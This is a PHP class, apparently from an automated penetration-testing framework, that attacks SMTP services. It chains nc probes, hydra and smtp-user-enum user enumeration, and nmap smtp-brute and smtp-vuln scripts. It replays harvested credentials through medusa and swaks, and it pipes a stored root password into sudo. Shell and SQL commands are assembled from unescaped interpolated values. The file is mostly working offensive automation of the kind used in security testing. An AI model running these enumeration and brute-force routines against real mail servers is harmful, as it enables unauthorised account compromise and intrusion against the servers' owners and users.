<?php


class service2smtp extends SERVICE {


    public function __construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo);
    }

/*
 auxiliary/scanner/smtp/smtp_enum                                                          normal  Yes    SMTP User Enumeration Utility
   auxiliary/scanner/smtp/smtp_ntlm_domain                                                   normal  Yes    SMTP NTLM Domain Extraction
   auxiliary/scanner/smtp/smtp_relay                                                         normal  Yes    SMTP Open Relay Detection
   
 */
    function service2smtp4exec(){
        // python -m smtpd -n -c DebuggingServer <ip>:<port>
        $result = "";

            $result .= $this->ssTitre(__FUNCTION__);
            
            $test_fake = $this->req_ret_str("echo \"EHLO $this->ip\" | nc $this->ip $this->port -n -v -q 3 ");
            $this->article("Test Service", $test_fake);
            $result =  $test_fake;
            if (empty($test_fake)) return $this->req2BD4in($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",base64_encode("Fake service"));
            
            $query = "hydra -L $this->dico_users $this->ip smtp-enum -e nsr -t 8 -w 5s -s $this->port  2>/dev/null | grep -i  'login:' | cut -d':' -f3 ";
            $result .= $this->cmd("localhost", $query); $result .= $this->auth2login4hydra($this->req_ret_str($query));
            
            
            
            $date = date("h:i:sa");
            $smtp =<<<CODE
HELO localhost
MAIL FROM: $this->user2email
RCPT TO: $this->user2email
DATA
Subject: Pentest on this server By $this->user2agent
test $this->ip $date

$this->user2agent

\n
\n
.
QUIT
CODE;
            
            
            $this->req_ret_str("echo '$smtp' | nc $this->ip $this->port -n -q 3");
            

            $query = "swaks --to $this->user2email --from=$this->user2email --server $this->ip:$this->port --body \"test $this->ip $date\" --header \"Subject: test mail server by $this->user2agent\" -tls ";
            $result .= $this->cmd("localhost", $query);
            $result .= $this->req_ret_str($query);
            
            
            
            $result .= $this->service2smtp4nmap();
            
            $query = "smtp-user-enum -M VRFY -U $this->dico_users -t $this->ip  | grep 'exists'  | sed  \"s/ exists//g\" | cut -d':' -f2 ";
            $result .= $this->cmd("localhost",$query);
            $users = $this->req_ret_str($query);
            if(!empty(trim($users))) {
            $result .= $users ;
            $users_tab = explode("\n", $users);
            foreach ($users_tab as $user2name) if (!empty($user2name)) $result .= $this->yesUSERS($this->port2id, $user2name, "smtp-user-enum -M VRFY","");
            }
            
            $query = "smtp-user-enum -M EXPN -U $this->dico_users -t $this->ip  | grep 'exists'  | sed  \"s/ exists//g\" | cut -d':' -f2 ";
            $result .= $this->cmd("localhost",$query);
            $users = $this->req_ret_str($query);
            if(!empty(trim($users))) {
                $result .= $users ;
                $users_tab = explode("\n", $users);
                foreach ($users_tab as $user2name) $result .= $this->yesUSERS($this->port2id, $user2name, "smtp-user-enum -M EXPN","");
            }
            
            $query = "smtp-user-enum -M RCPT -U $this->dico_users -t $this->ip  | grep 'exists'  | sed  \"s/ exists//g\" | cut -d':' -f2 ";
            $result .= $this->cmd("localhost",$query);
            $users = $this->req_ret_str($query);
            if(!empty(trim($users))) {
                $result .= $users ;
                $users_tab = explode("\n", $users);
                foreach ($users_tab as $user2name) $result .= $this->yesUSERS($this->port2id, $user2name, "smtp-user-enum -M RCPT","");
            }
             
            $sql_r = "select distinct(user2name) FROM USERS WHERE id8port = '$this->port2id' ORDER BY user2name;";
            $conn = $this->mysql_ressource->query($sql_r);
            while ($row = $conn->fetch_assoc()){
                $user2name = trim($row['user2name']);
                $result .= $this->article("USER FOUND FOR TEST", "$user2name");
                $result .= $this->port2auth4pass4medusa("smtp", $user2name, "password");
            }
            
            
            $sql_r_2 = "SELECT distinct(user2name),user2pass FROM AUTH WHERE ip = '$this->ip' AND ( user2name != '' AND user2pass != '' ) ORDER by user2gid ASC,user2uid ASC ";
            //echo "$sql_r_2 \n"; $this->pause();
            
            $conn = $this->mysql_ressource->query($sql_r_2);
            while($row = $conn->fetch_assoc()){
                $user2name = trim($row["user2name"]);
                $user2pass = trim($row["user2pass"]);
                
                if (!empty($user2name) && !empty($user2pass)) {
                    $result .= $this->port2auth4pass4medusa("smtp", $user2name, $user2pass);                   
                    $query = "swaks --to $this->user2email --from=$this->user2email --auth --auth-user=$user2name --auth-password=$user2pass --server $this->ip:$this->port --body \"test $this->ip $date\" --header \"Subject: test mail server by $this->user2agent\" -tls ";
                    $result .= $this->cmd("localhost", $query);
                    $result .= $this->req_ret_str($query);
                }
               
            }

            return $result;
        
    }
    
    function service2smtp4nmap(){
        $this->ssTitre(__FUNCTION__);
        $query = "echo '$this->root_passwd' | sudo -S nmap  --script \"smtp-commands,smtp-enum-users,smtp-brute,smtp-vuln-*\" --script-args \"smtp-enum-users.methods={EXPN,RCPT,VRFY},smtp-brute.userdb=$this->dico_users,smtp-brute.passdb=$this->dico_password.1000\"  -s$this->protocol -p $this->port -e $this->eth $this->ip -Pn  ";
        return $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
    }
    



  }
?>
